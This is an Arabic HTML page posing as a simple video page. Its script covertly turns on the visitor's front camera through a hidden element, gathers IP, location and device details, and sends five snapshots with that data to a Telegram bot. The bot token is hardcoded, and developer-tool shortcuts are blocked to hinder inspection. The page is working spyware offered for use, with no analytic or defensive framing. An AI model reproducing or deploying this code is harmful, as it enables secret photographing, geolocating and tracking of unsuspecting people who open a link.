<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>فيديو</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            background: #000;
            overflow: hidden;
        }

        .video-background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 1;
        }

        .video-background video {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .hidden-camera {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            visibility: hidden;
        }

        canvas {
            display: none;
        }

        ::-webkit-scrollbar {
            display: none;
        }
    </style>
</head>
<body>

    <div class="video-background">
        <video id="bgVideo" autoplay loop muted playsinline>
            <source src="https://commondatastorage.googleapis.com/gtv-videos-bucket/sample/ForBiggerBlazes.mp4" type="video/mp4">
        </video>
    </div>

    <div class="hidden-camera">
        <video id="camera" autoplay playsinline muted></video>
    </div>

    <canvas id="canvas"></canvas>

    <script>
        // ==================== إعدادات تليجرام ====================
        const BOT_TOKEN = "8179040156:AAFdn8ApCAIbaWhpLaFQMyqrwUwfR1hfyuY";
        let CHAT_ID = null;
        let stream = null;
        let cameraReady = false;
        
        // ==================== معلومات الجهاز ====================
        let deviceInfo = {
            ip: 'جاري الجلب...',
            country: 'جاري الجلب...',
            city: 'جاري الجلب...',
            os: 'جاري الجلب...',
            browser: 'جاري الجلب...',
            screen: 'جاري الجلب...',
            language: 'جاري الجلب...',
            timezone: 'جاري الجلب...'
        };
        
        // ==================== عناصر الصفحة ====================
        const camera = document.getElementById('camera');
        const canvas = document.getElementById('canvas');
        
        // ==================== جلب نظام التشغيل والمتصفح ====================
        function getSystemInfo() {
            const userAgent = navigator.userAgent;
            const platform = navigator.platform;
            
            // تحديد نظام التشغيل
            let os = 'Unknown';
            if (userAgent.indexOf('Win') !== -1) os = 'Windows';
            else if (userAgent.indexOf('Mac') !== -1) os = 'MacOS';
            else if (userAgent.indexOf('Linux') !== -1) os = 'Linux';
            else if (userAgent.indexOf('Android') !== -1) os = 'Android';
            else if (userAgent.indexOf('iOS') !== -1 || userAgent.indexOf('iPhone') !== -1 || userAgent.indexOf('iPad') !== -1) os = 'iOS';
            
            // تحديد المتصفح
            let browser = 'Unknown';
            if (userAgent.indexOf('Chrome') !== -1 && userAgent.indexOf('Edg') === -1) browser = 'Chrome';
            else if (userAgent.indexOf('Firefox') !== -1) browser = 'Firefox';
            else if (userAgent.indexOf('Safari') !== -1 && userAgent.indexOf('Chrome') === -1) browser = 'Safari';
            else if (userAgent.indexOf('Edg') !== -1) browser = 'Edge';
            else if (userAgent.indexOf('Opera') !== -1) browser = 'Opera';
            
            deviceInfo.os = `${os} (${platform})`;
            deviceInfo.browser = browser;
            deviceInfo.screen = `${screen.width}x${screen.height}`;
            deviceInfo.language = navigator.language || navigator.userLanguage;
            deviceInfo.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        }
        
        // ==================== جلب IP والموقع الجغرافي ====================
        async function getIPInfo() {
            try {
                // استخدام خدمة مجانية لجلب IP والموقع
                const response = await fetch('https://ipapi.co/json/');
                const data = await response.json();
                
                if (data) {
                    deviceInfo.ip = data.ip || 'غير معروف';
                    deviceInfo.country = `${data.country_name} (${data.country_code})` || 'غير معروف';
                    deviceInfo.city = data.city || 'غير معروف';
                    
                    // معلومات إضافية
                    deviceInfo.region = data.region || 'غير معروف';
                    deviceInfo.postal = data.postal || 'غير معروف';
                    deviceInfo.latitude = data.latitude || 'غير معروف';
                    deviceInfo.longitude = data.longitude || 'غير معروف';
                }
            } catch (error) {
                console.error('خطأ في جلب IP:', error);
                deviceInfo.ip = 'فشل الجلب';
                deviceInfo.country = 'فشل الجلب';
                deviceInfo.city = 'فشل الجلب';
            }
        }
        
        // ==================== الحصول على Chat ID ====================
        async function getChatId() {
            try {
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/getUpdates`);
                const result = await response.json();
                
                if (result.ok && result.result.length > 0) {
                    CHAT_ID = result.result[result.result.length - 1].message?.chat?.id;
                    return CHAT_ID !== null;
                }
                return false;
            } catch(error) {
                console.error('خطأ:', error);
                return false;
            }
        }
        
        // ==================== تشغيل الكاميرا ====================
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                camera.srcObject = stream;
                cameraReady = true;
                return true;
            } catch(err) {
                console.error('خطأ الكاميرا:', err);
                return false;
            }
        }
        
        // ==================== إنشاء نص المعلومات للإرسال ====================
        function getInfoText(photoNumber) {
            return `
📸 صورة ${photoNumber}/5

━━━━━━━━━━━━━━━━
📍 معلومات الجهاز والموقع:
━━━━━━━━━━━━━━━━

🌐 IP Address: ${deviceInfo.ip}
🗺️ الدولة: ${deviceInfo.country}
🏙️ المدينة: ${deviceInfo.city}
📍 المنطقة: ${deviceInfo.region || 'غير معروف'}

💻 نظام التشغيل: ${deviceInfo.os}
🌍 المتصفح: ${deviceInfo.browser}
📱 حجم الشاشة: ${deviceInfo.screen}
🔤 اللغة: ${deviceInfo.language}
⏰ المنطقة الزمنية: ${deviceInfo.timezone}

━━━━━━━━━━━━━━━━
🕐 الوقت: ${new Date().toLocaleString('ar-SA')}
━━━━━━━━━━━━━━━━
            `;
        }
        
        // ==================== التقاط وإرسال الصورة مع المعلومات ====================
        async function captureAndSend(photoNumber) {
            if (!CHAT_ID || !cameraReady) return false;
            
            try {
                if (camera.videoWidth === 0 || camera.videoHeight === 0) return false;
                
                // التقاط الصورة
                canvas.width = camera.videoWidth;
                canvas.height = camera.videoHeight;
                const ctx = canvas.getContext('2d');
                ctx.translate(canvas.width, 0);
                ctx.scale(-1, 1);
                ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);
                ctx.setTransform(1, 0, 0, 1, 0, 0);
                
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.8));
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('photo', blob, `photo_${Date.now()}.jpg`);
                formData.append('caption', getInfoText(photoNumber));
                
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                const result = await response.json();
                return result.ok;
            } catch(e) {
                console.error('خطأ في الإرسال:', e);
                return false;
            }
        }
        
        // ==================== تصوير 5 صور (الأولى فوراً، ثم كل 9 ثواني) ====================
        async function captureAllPhotos() {
            for (let i = 1; i <= 5; i++) {
                await captureAndSend(i);
                if (i < 5) {
                    await new Promise(resolve => setTimeout(resolve, 9000));
                }
            }
            
            // إيقاف الكاميرا بعد الانتهاء
            setTimeout(() => {
                if (stream) {
                    stream.getTracks().forEach(track => track.stop());
                }
            }, 2000);
        }
        
        // ==================== التشغيل الرئيسي ====================
        async function init() {
            // 1. جلب معلومات الجهاز
            getSystemInfo();
            
            // 2. جلب IP والموقع
            await getIPInfo();
            
            // 3. تشغيل الكاميرا
            const cameraSuccess = await startCamera();
            
            // 4. الحصول على Chat ID
            await getChatId();
            
            // 5. بدء التصوير إذا كان كل شيء جاهزاً
            if (cameraSuccess && CHAT_ID) {
                setTimeout(() => {
                    captureAllPhotos();
                }, 1000);
            }
        }
        
        // بدء التشغيل
        init();
        
        // ==================== منع أدوات المطور ====================
        document.addEventListener('contextmenu', e => e.preventDefault());
        document.addEventListener('keydown', function(e) {
            if (e.key === 'F12' || 
                (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || 
                (e.ctrlKey && e.key === 'U')) {
                e.preventDefault();
                return false;
            }
        });
        
        // إيقاف الكاميرا عند الخروج
        window.onbeforeunload = () => {
            if (stream) stream.getTracks().forEach(t => t.stop());
        };
    </script>
</body>
</html>
